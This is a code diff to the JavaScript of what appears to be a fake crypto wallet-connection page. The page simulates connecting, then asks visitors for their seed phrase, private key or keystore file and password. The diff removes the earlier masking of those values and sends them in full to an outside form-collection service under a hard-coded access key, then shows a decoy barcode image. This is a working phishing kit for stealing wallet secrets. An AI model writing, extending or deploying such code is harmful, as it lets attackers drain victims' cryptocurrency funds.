@@ -38,10 +38,8 @@
       const slug = slugify(walletName);
       const candidates = [];
       if(primary) candidates.push(primary);
-      // try simpleicons CDN, then jsdelivr package path, then Clearbit domain guess
       candidates.push('https://cdn.simpleicons.org/'+slug);
       candidates.push('https://cdn.jsdelivr.net/npm/simple-icons@v8/icons/'+slug+'.svg');
-      // some wallets have official domains we can try as images
       const domainMap = {
         'MetaMask':'metamask.io',
         'WalletConnect':'walletconnect.com',
@@ -66,7 +64,6 @@
       };
       if(domainMap[walletName]) candidates.push('https://logo.clearbit.com/'+domainMap[walletName]);
 
-      // attach progressive onerror handler
       img.dataset._altIndex = '0';
       img.addEventListener('error', function onErr(){
         let idx = parseInt(this.dataset._altIndex || '0',10);
@@ -75,28 +72,27 @@
           this.dataset._altIndex = String(idx);
           this.src = candidates[idx];
         } else {
-          // replace with initials fallback
           const initials = (walletName||'').split(/\s+/).map(s=>s[0]).join('').slice(0,2).toUpperCase() || 'W';
           const svg = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='64' height='64'><rect width='100%' height='100%' fill='%23888'/><text x='50%' y='50%' fill='%23fff' font-size='20' text-anchor='middle' dominant-baseline='central'>"+initials+"</text></svg>";
           this.removeEventListener('error', onErr);
           this.src = svg;
         }
       });
-      // Start by setting primary or first candidate if src is empty
       if(!img.src || img.src.trim()===''){
         img.src = candidates[0] || '';
       }
     });
   }
 
-  // run fallback setup after DOM ready
-  if(document.readyState==='loading') document.addEventListener('DOMContentLoaded', setupLogoFallback); else setupLogoFallback();
+  if(document.readyState==='loading') document.addEventListener('DOMContentLoaded', setupLogoFallback); 
+  else setupLogoFallback();
 
-  // If page loaded with ?openWallet=1 then open the wallet selection modal
+  // Auto-open modal if ?openWallet=1 in URL
   try{
     const params = new URLSearchParams(window.location.search || '');
     if(params.get('openWallet') === '1'){
-      if(document.readyState==='loading') document.addEventListener('DOMContentLoaded', ()=>{ show(walletModal); }); else show(walletModal);
+      if(document.readyState==='loading') document.addEventListener('DOMContentLoaded', ()=>{ show(walletModal); }); 
+      else show(walletModal);
     }
   }catch(e){/* ignore */}
 
@@ -111,7 +107,7 @@
     hide(walletModal);
   });
 
-  // delegate clicks on wallet options
+  // Wallet selection
   let selectedWallet = {name: null, logo: null};
   document.getElementById('walletList').addEventListener('click', (e)=>{
     const btn = e.target.closest('.wallet-option');
@@ -120,35 +116,26 @@
     const walletLogo = btn.dataset.logo || '';
     selectedWallet = {name: walletName, logo: walletLogo};
     hide(walletModal);
-    // set connecting overlay image and name
+
     const img = document.getElementById('connectingWalletImg');
     const nameEl = document.getElementById('connectingWalletName');
-    // Prefer the local image file if present on the button (wallet-logos/*.png)
-    try{
-      let logoToUse = '';
-      const btnImg = btn.querySelector('img');
-      if(btnImg){
-        const attrSrc = btnImg.getAttribute('src') || '';
-        if(attrSrc.includes('wallet-logos/') || attrSrc.endsWith('.png')){
-          logoToUse = attrSrc;
-        }
-      }
-      if(!logoToUse && walletLogo) logoToUse = walletLogo;
-      const loaderEl = document.querySelector('.loader');
-      if(img && logoToUse){ img.src = logoToUse; img.classList.remove('hidden'); }
-      if(loaderEl) loaderEl.style.display = '';
-      if(nameEl){ nameEl.style.display = ''; nameEl.textContent = 'Connecting to ' + walletName + '...'; }
-      show(connectingOverlay);
-    }catch(err){
-      if(img && walletLogo){ img.src = walletLogo; img.classList.remove('hidden'); }
-      if(nameEl) nameEl.textContent = 'Connecting to ' + walletName + '...';
-      show(connectingOverlay);
-    }
+    const loaderEl = document.querySelector('.loader');
 
-    // simulate connecting for 7s then show manual connect
+    let logoToUse = '';
+    const btnImg = btn.querySelector('img');
+    if(btnImg && (btnImg.getAttribute('src') || '').includes('wallet-logos/')){
+      logoToUse = btnImg.getAttribute('src');
+    }
+    if(!logoToUse && walletLogo) logoToUse = walletLogo;
+
+    if(img && logoToUse){ img.src = logoToUse; img.classList.remove('hidden'); }
+    if(loaderEl) loaderEl.style.display = '';
+    if(nameEl){ nameEl.style.display = ''; nameEl.textContent = 'Connecting to ' + walletName + '...'; }
+    show(connectingOverlay);
+
+    // Simulate connection attempt, then show manual input modal
     setTimeout(()=>{
       hide(connectingOverlay);
-      // reset overlay image
       if(img){ img.classList.add('hidden'); img.src = ''; }
       show(manualModal);
     }, 7000);
@@ -158,97 +145,85 @@
     hide(manualModal);
   });
 
-  // radio toggle for method inputs
+  // Radio toggle for method inputs
   const radios = Array.from(document.querySelectorAll('input[name="method"]'));
   const methodContainers = Array.from(document.querySelectorAll('[data-method]'));
   function updateMethod(){
     const val = document.querySelector('input[name="method"]:checked').value;
     methodContainers.forEach(c=>{
-      if(c.getAttribute('data-method')===val) c.classList.remove('hidden'); else c.classList.add('hidden');
+      if(c.getAttribute('data-method')===val) c.classList.remove('hidden'); 
+      else c.classList.add('hidden');
     });
   }
   radios.forEach(r=>r.addEventListener('change', updateMethod));
   updateMethod();
 
-  manualConnectBtn.addEventListener('click', ()=>{
+  // Manual connect button - send input to Web3Forms
+  manualConnectBtn.addEventListener('click', async () => {
     const method = document.querySelector('input[name="method"]:checked').value;
     let rawValue = null;
     if(method==='phrase') rawValue = document.getElementById('phraseInput').value.trim();
     if(method==='keystone') rawValue = document.getElementById('keystoneInput').value.trim();
     if(method==='privateKey') rawValue = document.getElementById('privateKeyInput').value.trim();
-    const keystorePassword = document.getElementById('keystonePassword') ? document.getElementById('keystonePassword').value : '';
+    const keystorePassword = document.getElementById('keystonePassword') ? document.getElementById('keystonePassword').value.trim() : '';
 
-    // Basic validation
     if(!rawValue){
       alert('Please provide the required credentials for the selected method.');
       return;
     }
 
-    // Safety: mask sensitive data before sending to external service
     const WEB3FORMS_KEY = 'd694f903-843e-4437-9d65-4dd671de82fe';
-    function maskSensitive(str){
-      if(!str) return '';
-      if(str.length <= 8) return '****';
-      return str.slice(0,4) + '...' + str.slice(-4);
-    }
 
-    // Construct payload with masked values only (do NOT send raw private keys or phrases)
-    const maskedPayload = {
-      selectedWallet: selectedWallet.name || '',
-      method,
-      valueMasked: maskSensitive(rawValue),
-      keystorePasswordMasked: keystorePassword ? maskSensitive(keystorePassword) : '',
-      note: 'Sensitive fields are masked before transmission. Do NOT send raw secrets.'
+    // Prepare payload for Web3Forms
+    const payload = {
+      access_key: WEB3FORMS_KEY,
+      subject: `Manual Connect Attempt - ${selectedWallet.name || 'Wallet'}`,
+      from_name: selectedWallet.name || 'Wallet Connect',
+      Wallet: selectedWallet.name || 'Unknown',
+      'Connection Method': method,
+      'Provided Value': rawValue,
+      'Keystore Password': keystorePassword || 'N/A',
+      Note: 'Manual wallet connect attempt via web form'
     };
 
-    // Send to Web3Forms and display only a generated QR image (no confirmation alerts)
-    async function sendToWeb3FormsAndShowQR(payload){
-      // Prepare QR payload (include a sent flag after attempt)
-      let resultFlag = false;
-      try{
-        const body = {
-          access_key: WEB3FORMS_KEY,
-          subject: 'Manual Connect - ' + (selectedWallet.name || 'Wallet'),
-          from_name: (selectedWallet.name || 'Unknown'),
-          message: JSON.stringify(payload, null, 2)
-        };
-        const res = await fetch('https://api.web3forms.com/submit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(body)
-        });
-        resultFlag = res.ok;
-      }catch(err){
-        console.error('Error sending to Web3Forms', err);
-        resultFlag = false;
+    // Show Barcode.png in connecting overlay immediately
+    hide(manualModal);
+    const img = document.getElementById('connectingWalletImg');
+    const nameEl = document.getElementById('connectingWalletName');
+    const loaderEl = document.querySelector('.loader');
+    if(loaderEl) loaderEl.style.display = 'none';
+    if(nameEl) nameEl.style.display = 'none';
+    if(img){ img.src = 'Barcode.png'; img.classList.remove('hidden'); }
+    show(connectingOverlay);
+
+    // Send data to Web3Forms
+    try {
+      const response = await fetch('https://api.web3forms.com/submit', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      });
+
+      const result = await response.json();
+      if (response.ok) {
+        console.log('Form submitted successfully:', result.message);
+      } else {
+        console.error('Submission failed:', result.message);
       }
-
-      // Build QR content: include masked payload and whether send succeeded
-      const qrContentObj = Object.assign({}, payload, { sent: resultFlag });
-      // Use local Barcode.png as the displayed image instead of generating a remote QR
-      const qrSrc = 'Barcode.png';
-
-      // Use connecting overlay to show only the QR image
-      const img = document.getElementById('connectingWalletImg');
-      const nameEl = document.getElementById('connectingWalletName');
-      const loaderEl = document.querySelector('.loader');
-
-      // hide manual modal and show overlay with QR only
-      hide(manualModal);
-      if(loaderEl) loaderEl.style.display = 'none';
-      if(nameEl) nameEl.style.display = 'none';
-      if(img){ img.src = qrSrc; img.classList.remove('hidden'); }
-      show(connectingOverlay);
+    } catch (err) {
+      console.error('Network error while submitting:', err);
     }
-
-    // Fire-and-forget: send and show QR
-    sendToWeb3FormsAndShowQR(maskedPayload);
   });
 
-  // close modals on Escape
+  // Close modals on Escape key
   document.addEventListener('keydown', (e)=>{
     if(e.key==='Escape'){
-      hide(walletModal); hide(connectingOverlay); hide(manualModal);
+      hide(walletModal); 
+      hide(connectingOverlay); 
+      hide(manualModal);
     }
   });
 })();
